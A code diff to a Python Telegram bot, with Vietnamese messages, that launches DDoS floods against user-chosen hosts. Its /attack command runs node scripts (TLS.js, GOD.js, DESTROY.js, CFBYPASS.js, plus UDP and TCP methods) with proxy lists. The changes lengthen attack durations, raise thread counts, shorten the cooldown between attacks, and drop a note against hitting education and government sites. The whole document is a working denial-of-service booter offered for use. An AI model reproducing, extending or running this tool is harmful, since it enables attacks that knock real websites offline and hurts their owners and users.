@@ -156,10 +156,10 @@ def methods(message):
 📌 Tất Cả Methods:
 🚀 Layer7
 XAU-TRAI
-DEP-TRAI
-HTTPS
-PRO
-[ NO HIT EDU, GOV]
+DEP-TRAI - C2
+HTTPS - C@.01
+PRO : LUXUR8
+[ BY NEWH2R7HJK]
 []
 🚀 Layer4
 TCP-OPEN
@@ -179,7 +179,7 @@ def run_attack(command, duration, message):
         # Check CPU usage and terminate if it's too high for 10 seconds
         if psutil.cpu_percent(interval=1) >= 1:
             time_passed = time.time() - start_time
-            if time_passed >= 200:
+            if time_passed >= 120:
                 cmd_process.terminate()
                 bot.reply_to(message, "DONE!!!")
                 return
@@ -208,7 +208,7 @@ def attack_command(message):
 
     current_time = time.time()
     if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
-        remaining_time = int(400 - (current_time - cooldown_dict[username].get('attack', 0)))
+        remaining_time = int(20 - (current_time - cooldown_dict[username].get('attack', 0)))
         bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attack.")
         return
     
@@ -235,16 +235,16 @@ def attack_command(message):
     if method in ['XAU-TRAI', 'PRO', 'DEP-TRAI', 'HTTPS', 'UDP-CHAOS', 'TCP-OPEN']:
         # Update the command and duration based on the selected method
         if method == 'XAU-TRAI':
-            command = ["node", "TLS.js", host, "45", "64", "5"]
-            duration = 45
+            command = ["node", "TLS.js", host, "120", "64", "10"]
+            duration = 120
         elif method == 'PRO':
-            command = ["node", "GOD.js", host, "45", "64", "3"]
-            duration = 0
+            command = ["node", "GOD.js", host, "120", "64", "7"]
+            duration = 120
         elif method == 'DEP-TRAI':
-            command = ["node", "DESTROY.js", host, "45", "64", "5", "proxy.txt"]
-            duration = 45
+            command = ["node", "DESTROY.js", host, "200", "64", "20", "proxy.txt"]
+            duration = 200
         elif method == 'HTTPS':
-            command = ["node", "CFBYPASS.js", host, "120", "64", "5", "proxy.txt"]
+            command = ["node", "CFBYPASS.js", host, "120", "64", "15", "proxy.txt"]
             duration = 120
         elif method == 'UDP-CHAOS':
             if not port.isdigit():
@@ -263,7 +263,7 @@ def attack_command(message):
 
         attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
         attack_thread.start()
-        bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃ SENT ATTACK\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣By: @{username} \n┣Host:{host} \n┣Methods: {method} \n┣Time: {duration}s\n┣➤ Owner @newh2r7hjk\n┗━━━━━━━━━━━━━━')
+        bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃ SENT ATTACK\n┗━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━┓\n┣By: @{username} \n┣Host:{host} \n┣Methods: {method} \n┣Time: {duration}s\n┣➤ Owner @newh2r7hjk\n┗━━━━━━━━━━━━━━')
     else:
         bot.reply_to(message, 'USE COMMAND /methods')
 
